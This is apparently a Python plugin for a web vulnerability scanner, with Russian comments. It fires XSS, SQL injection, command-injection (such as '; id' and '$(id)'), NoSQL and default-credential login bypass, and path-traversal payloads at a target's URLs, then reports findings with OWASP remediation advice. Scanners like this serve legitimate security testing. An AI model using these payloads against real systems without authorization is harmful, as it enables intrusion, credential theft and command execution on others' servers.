"""
Модуль активного тестирования уязвимостей с симуляцией эксплойтов.
"""
import requests
import re
import urllib.parse
import time
import json
from typing import List, Dict, Any, Optional, Tuple
from requests.adapters import HTTPAdapter

try:
    from core.plugin_base import (
        BasePlugin, ScanTarget, ScanResult, Vulnerability, SeverityLevel
    )
    from config.logging_config import get_logger
except ImportError:
    # Fallback for direct execution
    import sys
    import os
    sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(__file__))))
    from core.plugin_base import (
        BasePlugin, ScanTarget, ScanResult, Vulnerability, SeverityLevel
    )
    from config.logging_config import get_logger


class ActiveVulnerabilityTester(BasePlugin):
    """Плагин для активного тестирования уязвимостей с симуляцией эксплойтов."""
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        self.logger = get_logger(self.__class__.__name__)
        self.verify_ssl = config.get('verify_ssl', False)
        self.max_redirects = config.get('max_redirects', 5)
        self.exploit_timeout = config.get('exploit_timeout', 10)
        self.test_depth = config.get('test_depth', 'medium')  # low, medium, high
        
        # Настройка сессии
        self.session = requests.Session()
        adapter = HTTPAdapter(max_retries=3)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Загрузка полезных нагрузок эксплойтов
        self._init_payloads()
    
    def _init_payloads(self):
        """Инициализация полезных нагрузок эксплойтов."""
        # XSS полезные нагрузки
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "'\"><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
        ]
        
        # SQL инъекции полезные нагрузки
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "' OR 1=1#",
            "' UNION SELECT NULL--",
            "' UNION SELECT user,password FROM users--",
            "' UNION SELECT version()--",
            "' UNION SELECT database()--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND (SELECT SUBSTRING(user(),1,1)) = 'r'--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--",
            "'; SELECT SLEEP(5)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
        ]
        
        # Полезные нагрузки для внедрения команд
        self.rce_payloads = [
            "; id",
            "| id",
            "& id",
            "&& id",
            "|| id",
            "; /bin/id",
            "| /usr/bin/id",
            "&& /bin/whoami",
            ";i`d",
            ";i'd'",
            "$(id)",
            "`id`",
            "; sleep 5",
            "| sleep 5",
            "&& ping -c 5 127.0.0.1",
            "& dir",
            "&& dir",
            "| dir",
            "; dir",
        ]
        
        # Полезные нагрузки для обхода аутентификации
        self.auth_bypass_payloads = [
            {"username": "admin'--", "password": "anything"},
            {"username": "admin'/*", "password": "*/"},
            {"username": "' OR '1'='1'--", "password": "anything"},
            {"username": "' OR 1=1#", "password": "anything"},
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": ""},
            {"username": "root", "password": "root"},
            {"username": "test", "password": "test"},
            {"username": "guest", "password": "guest"},
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        ]
    
    def get_name(self) -> str:
        return "ActiveVulnerabilityTester"
    
    def get_description(self) -> str:
        return "Performs active vulnerability testing with exploit simulation for XSS, SQLi, RCE, and auth bypass"
    
    def get_version(self) -> str:
        return "1.0.0"
    
    def is_applicable(self, target: ScanTarget) -> bool:
        """Active testing is applicable to web targets."""
        web_ports = [80, 443, 8080, 8443, 8000, 8888]
        return any(port in web_ports for port in target.ports) if target.ports else True
    
    def get_supported_services(self) -> List[str]:
        return ['HTTP', 'HTTPS', 'Web Applications']
    
    def scan(self, target: ScanTarget) -> ScanResult:
        """Perform active vulnerability testing."""
        result = ScanResult(target, self.get_name())
        
        try:
            self.logger.info(f"Starting active vulnerability testing on {target.host}")
            
            # Get target URLs
            urls = self._get_target_urls(target)
            
            total_tests = 0
            for url in urls:
                self.logger.debug(f"Testing URL: {url}")
                
                # Test for different vulnerabilities
                total_tests += self._test_xss_vulnerabilities(url, result)
                total_tests += self._test_sql_injection(url, result)
                total_tests += self._test_rce_vulnerabilities(url, result)
                total_tests += self._test_auth_bypass(url, result)
                total_tests += self._test_directory_traversal(url, result)
            
            result.metadata['total_tests_performed'] = total_tests
            result.metadata['urls_tested'] = len(urls)
            
            self.logger.info(
                f"Active vulnerability testing completed on {target.host}. "
                f"Performed {total_tests} tests on {len(urls)} URLs."
            )
            
        except Exception as e:
            self.logger.error(f"Active vulnerability testing failed on {target.host}: {e}")
            result.finish("error", str(e))
            return result
        
        result.finish("completed")
        return result
    
    def _get_target_urls(self, target: ScanTarget) -> List[str]:
        """Get list of URLs to test."""
        urls = []
        web_ports = [80, 443, 8080, 8443, 8000, 8888]
        
        if target.ports:
            for port in target.ports:
                if port in web_ports:
                    protocol = "https" if port in [443, 8443] else "http"
                    url = f"{protocol}://{target.host}:{port}"
                    urls.append(url)
        else:
            urls.extend([
                f"http://{target.host}",
                f"https://{target.host}"
            ])
        
        return urls
    
    def _make_request(self, url: str, method: str = "GET", **kwargs) -> Optional[requests.Response]:
        """Make HTTP request with proper error handling."""
        try:
            kwargs['verify'] = self.verify_ssl
            kwargs['timeout'] = self.exploit_timeout
            kwargs['allow_redirects'] = kwargs.get('allow_redirects', True)
            
            response = self.session.request(method, url, **kwargs)
            return response
            
        except requests.exceptions.RequestException as e:
            self.logger.debug(f"Request failed for {url}: {e}")
            return None
    
    def _test_xss_vulnerabilities(self, base_url: str, result: ScanResult) -> int:
        """Test for XSS vulnerabilities."""
        tests_performed = 0
        test_params = ['q', 'search', 'query', 'name', 'input', 'data', 'value', 'text']
        
        for payload in self.xss_payloads[:5]:  # Limit payloads for performance
            for param in test_params:
                tests_performed += 1
                
                # Test GET parameter
                test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                response = self._make_request(test_url)
                
                if response and self._is_xss_successful(response, payload):
                    vulnerability = self._create_xss_vulnerability(
                        base_url, param, payload, response, "GET"
                    )
                    result.add_vulnerability(vulnerability)
                
                time.sleep(0.1)
        
        return tests_performed
    
    def _is_xss_successful(self, response: requests.Response, payload: str) -> bool:
        """Check if XSS payload was successful."""
        if payload in response.text:
            return True
        
        xss_indicators = ["alert('XSS')", "alert(\"XSS\")", "<script>", "onerror=", "onload="]
        response_lower = response.text.lower()
        
        for indicator in xss_indicators:
            if indicator.lower() in response_lower:
                return True
        
        return False
    
    def _create_xss_vulnerability(self, url: str, param: str, payload: str, 
                                response: requests.Response, method: str) -> Vulnerability:
        """Create XSS vulnerability object."""
        evidence = f"Method: {method}\nParameter: {param}\nPayload: {payload}\nResponse Status: {response.status_code}"
        if payload in response.text:
            evidence += "\nPayload successfully reflected in response"
        
        return Vulnerability(
            id=f"xss_{method.lower()}_{param}_{hash(url)}",
            name=f"Cross-Site Scripting (XSS) - {method} Parameter",
            description=f"XSS vulnerability found in {method} parameter '{param}'. "
                       f"The application reflects user input without proper sanitization.",
            severity=SeverityLevel.HIGH,
            confidence=0.9,
            target=url,
            evidence=evidence,
            solution="1. Implement proper input validation and output encoding\n"
                    "2. Use Content Security Policy (CSP) headers\n"
                    "3. Sanitize user input using a whitelist approach",
            references=[
                "https://owasp.org/www-community/attacks/xss/",
                "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
            ]
        )
    
    def _test_sql_injection(self, base_url: str, result: ScanResult) -> int:
        """Test for SQL injection vulnerabilities."""
        tests_performed = 0
        test_params = ['id', 'user', 'page', 'category', 'search', 'login']
        
        for payload in self.sql_payloads[:8]:  # Limit payloads
            for param in test_params:
                tests_performed += 1
                
                test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                response = self._make_request(test_url)
                
                if response and self._is_sql_injection_successful(response, payload):
                    vulnerability = self._create_sql_vulnerability(
                        base_url, param, payload, response, "GET"
                    )
                    result.add_vulnerability(vulnerability)
                
                time.sleep(0.1)
        
        return tests_performed
    
    def _is_sql_injection_successful(self, response: requests.Response, payload: str) -> bool:
        """Check if SQL injection was successful."""
        sql_errors = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Microsoft OLE DB Provider",
            r"ORA-[0-9][0-9][0-9][0-9]",
        ]
        
        for error_pattern in sql_errors:
            if re.search(error_pattern, response.text, re.IGNORECASE):
                return True
        
        if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
            return response.elapsed.total_seconds() > 3
        
        return False
    
    def _create_sql_vulnerability(self, url: str, param: str, payload: str,
                                response: requests.Response, method: str) -> Vulnerability:
        """Create SQL injection vulnerability object."""
        evidence = f"Method: {method}\nParameter: {param}\nPayload: {payload}\nResponse Status: {response.status_code}"
        
        return Vulnerability(
            id=f"sqli_{method.lower()}_{param}_{hash(url)}",
            name=f"SQL Injection - {method} Parameter",
            description=f"SQL injection vulnerability found in {method} parameter '{param}'.",
            severity=SeverityLevel.CRITICAL,
            confidence=0.95,
            target=url,
            evidence=evidence,
            solution="1. Use parameterized queries or prepared statements\n"
                    "2. Implement proper input validation\n"
                    "3. Apply the principle of least privilege for database accounts",
            references=[
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
            ]
        )
    
    def _test_rce_vulnerabilities(self, base_url: str, result: ScanResult) -> int:
        """Test for RCE vulnerabilities."""
        tests_performed = 0
        test_params = ['cmd', 'command', 'exec', 'system', 'shell', 'run']
        
        for payload in self.rce_payloads[:6]:  # Limit payloads
            for param in test_params:
                tests_performed += 1
                
                test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                response = self._make_request(test_url)
                
                if response and self._is_rce_successful(response, payload):
                    vulnerability = self._create_rce_vulnerability(
                        base_url, param, payload, response, "GET"
                    )
                    result.add_vulnerability(vulnerability)
                
                time.sleep(0.2)
        
        return tests_performed
    
    def _is_rce_successful(self, response: requests.Response, payload: str) -> bool:
        """Check if RCE was successful."""
        rce_indicators = [
            r"uid=\d+.*gid=\d+",
            r"root:",
            r"bin.*sbin",
            r"Volume in drive",
            r"Directory of",
        ]
        
        for indicator in rce_indicators:
            if re.search(indicator, response.text, re.IGNORECASE):
                return True
        
        if "sleep" in payload.lower() or "ping" in payload.lower():
            return response.elapsed.total_seconds() > 3
        
        return False
    
    def _create_rce_vulnerability(self, url: str, param: str, payload: str,
                                response: requests.Response, method: str) -> Vulnerability:
        """Create RCE vulnerability object."""
        evidence = f"Method: {method}\nParameter: {param}\nPayload: {payload}\nResponse Status: {response.status_code}"
        
        if "uid=" in response.text:
            evidence += "\nCommand execution confirmed: Unix user ID information found"
        elif "Directory of" in response.text:
            evidence += "\nCommand execution confirmed: Windows directory listing found"
        
        return Vulnerability(
            id=f"rce_{method.lower()}_{param}_{hash(url)}",
            name=f"Remote Code Execution - {method} Parameter",
            description=f"RCE vulnerability found in {method} parameter '{param}'.",
            severity=SeverityLevel.CRITICAL,
            confidence=0.9,
            target=url,
            evidence=evidence,
            solution="1. Never execute user input as system commands\n"
                    "2. Use whitelist validation for any system interactions\n"
                    "3. Apply the principle of least privilege",
            references=[
                "https://owasp.org/www-community/attacks/Code_Injection",
                "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
            ]
        )
    
    def _test_auth_bypass(self, base_url: str, result: ScanResult) -> int:
        """Test for authentication bypass vulnerabilities."""
        tests_performed = 0
        login_paths = ["/login", "/admin/login", "/administrator", "/wp-admin"]
        
        for path in login_paths:
            login_url = urllib.parse.urljoin(base_url, path)
            response = self._make_request(login_url)
            
            if response and response.status_code == 200 and self._has_login_form(response.text):
                for payload in self.auth_bypass_payloads[:6]:  # Limit payloads
                    tests_performed += 1
                    
                    if self._test_auth_payload(login_url, payload):
                        vulnerability = self._create_auth_bypass_vulnerability(login_url, payload)
                        result.add_vulnerability(vulnerability)
                    
                    time.sleep(0.2)
        
        return tests_performed
    
    def _has_login_form(self, html: str) -> bool:
        """Check if HTML contains a login form."""
        login_indicators = [
            r'<input[^>]*type=["\']password["\']',
            r'<input[^>]*name=["\']password["\']',
            r'<input[^>]*name=["\']username["\']',
        ]
        
        for pattern in login_indicators:
            if re.search(pattern, html, re.IGNORECASE):
                return True
        return False
    
    def _test_auth_payload(self, login_url: str, payload: Dict[str, Any]) -> bool:
        """Test authentication bypass payload."""
        try:
            if isinstance(payload["username"], dict):
                headers = {'Content-Type': 'application/json'}
                response = self._make_request(
                    login_url, method="POST", 
                    data=json.dumps(payload),
                    headers=headers
                )
            else:
                response = self._make_request(login_url, method="POST", data=payload)
            
            if response:
                return self._is_auth_bypass_successful(response)
            return False
            
        except Exception as e:
            self.logger.debug(f"Auth bypass test failed: {e}")
            return False
    
    def _is_auth_bypass_successful(self, response: requests.Response) -> bool:
        """Check if authentication bypass was successful."""
        success_indicators = ["welcome", "dashboard", "logout", "profile"]
        response_lower = response.text.lower()
        
        for indicator in success_indicators:
            if indicator in response_lower:
                return True
        
        if response.status_code in [302, 301] and response.headers.get('Location'):
            location = response.headers['Location']
            if any(path in location.lower() for path in ['dashboard', 'admin', 'profile']):
                return True
        
        return False
    
    def _create_auth_bypass_vulnerability(self, url: str, payload: Dict[str, Any]) -> Vulnerability:
        """Create authentication bypass vulnerability object."""
        return Vulnerability(
            id=f"auth_bypass_{hash(url)}_{hash(str(payload))}",
            name="Authentication Bypass",
            description="Authentication mechanism can be bypassed using malicious input.",
            severity=SeverityLevel.CRITICAL,
            confidence=0.85,
            target=url,
            evidence=f"Successful bypass using payload: {payload}",
            solution="1. Implement proper input validation for authentication\n"
                    "2. Use parameterized queries to prevent SQL injection\n"
                    "3. Implement strong password policies",
            references=[
                "https://owasp.org/www-community/attacks/Authentication_bypass",
                "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
            ]
        )
    
    def _test_directory_traversal(self, base_url: str, result: ScanResult) -> int:
        """Test for directory traversal vulnerabilities."""
        tests_performed = 0
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd"
        ]
        
        test_params = ['file', 'path', 'page', 'include']
        
        for payload in traversal_payloads:
            for param in test_params:
                tests_performed += 1
                
                test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                response = self._make_request(test_url)
                
                if response and self._is_traversal_successful(response):
                    vulnerability = Vulnerability(
                        id=f"directory_traversal_{param}_{hash(base_url)}",
                        name="Directory Traversal",
                        description=f"Directory traversal vulnerability in parameter '{param}'.",
                        severity=SeverityLevel.HIGH,
                        confidence=0.85,
                        target=base_url,
                        evidence=f"Successful traversal with payload: {payload}",
                        solution="1. Implement proper input validation\n2. Use whitelist for file access",
                        references=["https://owasp.org/www-community/attacks/Path_Traversal"]
                    )
                    result.add_vulnerability(vulnerability)
                
                time.sleep(0.1)
        
        return tests_performed
    
    def _is_traversal_successful(self, response: requests.Response) -> bool:
        """Check if directory traversal was successful."""
        file_indicators = [
            r"root:.*:/bin/bash",  # /etc/passwd
            r"\[drivers\]",  # Windows hosts file
            r"# This is a sample HOSTS file"
        ]
        
        for pattern in file_indicators:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        return False